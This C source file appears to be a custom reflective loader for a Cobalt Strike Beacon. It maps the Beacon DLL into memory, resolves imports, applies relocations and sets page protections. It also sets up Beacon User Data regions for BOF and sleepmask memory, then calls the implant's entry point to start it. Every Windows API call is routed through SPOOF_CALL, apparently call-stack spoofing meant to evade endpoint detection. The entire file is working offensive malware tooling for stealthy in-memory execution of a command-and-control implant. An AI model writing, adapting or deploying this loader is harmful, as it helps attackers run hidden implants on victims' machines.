#include    "Instance.h"
#include    "Prototypes.h"
#include    "Macros.h"
#include    "Ntdll.h"
#include	"BeaconUserData.h"
#include	"PreHash.h"


D_SEC(B)
VOID Main(
    _In_ PVOID      Param,
    _In_ PINSTANCE  Inst
    )
{
    NTSTATUS status = 0;
    CONTEXT ctx = {0};
    HANDLE hThread = NULL;
    UINT_PTR entryPoint = 0;

	// Beacon user data stuff
	HANDLE hHeap = SPOOF_CALL(Inst, Inst->RtlCreateHeap, HEAP_NO_SERIALIZE, NULL, NULL, NULL, NULL);//SPOOF_CALL(Inst, Inst->GetProcessHeap, NULL);

	USER_DATA					userData = { 0 };
	PALLOCATED_MEMORY			allocatedMemory = (PALLOCATED_MEMORY)SPOOF_CALL(Inst, Inst->RtlAllocateHeap, hHeap, HEAP_ZERO_MEMORY, sizeof(ALLOCATED_MEMORY));
	
	xMemset(
		(void*)allocatedMemory,
		0,
		sizeof(ALLOCATED_MEMORY)
	);

	userData.allocatedMemory 	= allocatedMemory;
    userData.version 			= COBALT_STRIKE_VERSION;

    UINT_PTR uiMemPeAddr = U_PTR(Inst->Info.End);
    PIMAGE_DOS_HEADER pDosHeader = uiMemPeAddr;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(uiMemPeAddr + pDosHeader->e_lfanew);

    SIZE_T dwImgSize = pNtHeader->OptionalHeader.SizeOfImage;

    PVOID pMemPeAddr = NULL;
    status = SPOOF_CALL(Inst, Inst->NtAllocateVirtualMemory, NtCurrentProcess, &pMemPeAddr, 0, &dwImgSize, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
        return;

	allocatedMemory->AllocatedMemoryRegions[0].Purpose = PURPOSE_BEACON_MEMORY;
	allocatedMemory->AllocatedMemoryRegions[0].RegionSize = dwImgSize;
	allocatedMemory->AllocatedMemoryRegions[0].Type = MEM_COMMIT;
	allocatedMemory->AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;
	allocatedMemory->AllocatedMemoryRegions[0].CleanupInformation.Cleanup = TRUE;
	allocatedMemory->AllocatedMemoryRegions[0].AllocationBase = pMemPeAddr;


	// Allocate rtefion for BOF & SLeepmask

	LPVOID lpBofAllocatedRegion = NULL;
	SIZE_T stBofSize = BOF_MEMORY_SIZE;

    status = SPOOF_CALL(Inst, Inst->NtAllocateVirtualMemory, (HANDLE)-1, &lpBofAllocatedRegion, 0, &stBofSize, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
        return;

    allocatedMemory->AllocatedMemoryRegions[1].Purpose = PURPOSE_BOF_MEMORY;
	allocatedMemory->AllocatedMemoryRegions[1].AllocationBase = lpBofAllocatedRegion;
	allocatedMemory->AllocatedMemoryRegions[1].RegionSize = BOF_MEMORY_SIZE;
	allocatedMemory->AllocatedMemoryRegions[1].Type = MEM_COMMIT;

	allocatedMemory->AllocatedMemoryRegions[1].CleanupInformation.Cleanup = TRUE;
	allocatedMemory->AllocatedMemoryRegions[1].CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;

	allocatedMemory->AllocatedMemoryRegions[1].Sections[0].Label = LABEL_BUFFER;
	allocatedMemory->AllocatedMemoryRegions[1].Sections[0].BaseAddress = lpBofAllocatedRegion;
	allocatedMemory->AllocatedMemoryRegions[1].Sections[0].VirtualSize = BOF_MEMORY_SIZE;
	allocatedMemory->AllocatedMemoryRegions[1].Sections[0].CurrentProtect = PAGE_READWRITE;
	allocatedMemory->AllocatedMemoryRegions[1].Sections[0].PreviousProtect = PAGE_READWRITE;
	allocatedMemory->AllocatedMemoryRegions[1].Sections[0].MaskSection = MASK_TRUE;

	LPVOID lpSleepmaskAllocatedRegion = NULL;
	SIZE_T stSleepMaskSize = SLEEPMASK_MEMORY_SIZE;

    status = SPOOF_CALL(Inst, Inst->NtAllocateVirtualMemory, (HANDLE)-1, &lpSleepmaskAllocatedRegion, 0, &stSleepMaskSize, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
        return;
    allocatedMemory->AllocatedMemoryRegions[2].Purpose = PURPOSE_SLEEPMASK_MEMORY;
	allocatedMemory->AllocatedMemoryRegions[2].AllocationBase = lpSleepmaskAllocatedRegion;
	allocatedMemory->AllocatedMemoryRegions[2].RegionSize = SLEEPMASK_MEMORY_SIZE;
	allocatedMemory->AllocatedMemoryRegions[2].Type = MEM_COMMIT;

	allocatedMemory->AllocatedMemoryRegions[2].CleanupInformation.Cleanup = TRUE;
	allocatedMemory->AllocatedMemoryRegions[2].CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;

	allocatedMemory->AllocatedMemoryRegions[2].Sections[0].Label = LABEL_BUFFER;
	allocatedMemory->AllocatedMemoryRegions[2].Sections[0].BaseAddress = lpSleepmaskAllocatedRegion;
	allocatedMemory->AllocatedMemoryRegions[2].Sections[0].VirtualSize = SLEEPMASK_MEMORY_SIZE;
	allocatedMemory->AllocatedMemoryRegions[2].Sections[0].CurrentProtect = PAGE_READWRITE;
	allocatedMemory->AllocatedMemoryRegions[2].Sections[0].PreviousProtect = PAGE_READWRITE;
	allocatedMemory->AllocatedMemoryRegions[2].Sections[0].MaskSection = MASK_TRUE;

    CopySections(pMemPeAddr, pNtHeader, uiMemPeAddr);

    if (!ProcessImportTable(pMemPeAddr, pNtHeader, Inst))
        return;

    ApplyBaseRelocations(pMemPeAddr, pNtHeader);


   	if (!PatchMemoryProtection(pMemPeAddr, pNtHeader, Inst, allocatedMemory))
        return;
   

    entryPoint = ((ULONG_PTR)pMemPeAddr + pNtHeader->OptionalHeader.AddressOfEntryPoint);

   	((DLLMAIN)entryPoint)((HINSTANCE)pMemPeAddr, DLL_BEACON_USER_DATA, &userData);    // Init BUD
    ((DLLMAIN)entryPoint)((HINSTANCE)&Main, DLL_PROCESS_ATTACH, NULL);    // Init beacon
    ((DLLMAIN)entryPoint)((HINSTANCE)&Main, 0x4, NULL);    // Init beacon

    return;
}
